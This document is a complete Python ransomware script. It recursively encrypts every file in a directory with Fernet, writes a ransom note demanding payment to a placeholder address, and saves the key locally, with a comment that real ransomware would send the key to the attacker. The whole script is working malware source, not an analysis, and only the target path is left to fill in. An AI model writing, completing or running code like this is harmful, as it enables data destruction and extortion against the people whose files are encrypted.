import os
import random
import string
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to encrypt a file
def encrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)
    print(f"Encrypted: {file_path}")

# Function to decrypt a file
def decrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)
    print(f"Decrypted: {file_path}")

# Generate a ransom note
def generate_ransom_note(file_path):
    ransom_note = f"""
    YOUR FILES HAVE BEEN ENCRYPTED!
    To decrypt your files, you need to pay a ransom.
    Contact [ransomware@example.com] for more information.
    """
    with open(file_path, 'w') as file:
        file.write(ransom_note)
    print(f"Ransom note created: {file_path}")

# Main function to encrypt files in a directory
def main():
    directory_to_encrypt = "/path/to/your/directory"
    ransom_note_path = os.path.join(directory_to_encrypt, "RANSOM_NOTE.txt")

    # Encrypt files in the directory
    for root, _, files in os.walk(directory_to_encrypt):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                encrypt_file(file_path, cipher_suite)

    # Generate a ransom note
    generate_ransom_note(ransom_note_path)

    # Save the key to a file for decryption (in real ransomware, this key would be sent to the attacker)
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)
    print("Encryption key saved as 'encryption_key.key'")

if __name__ == "__main__":
    main()
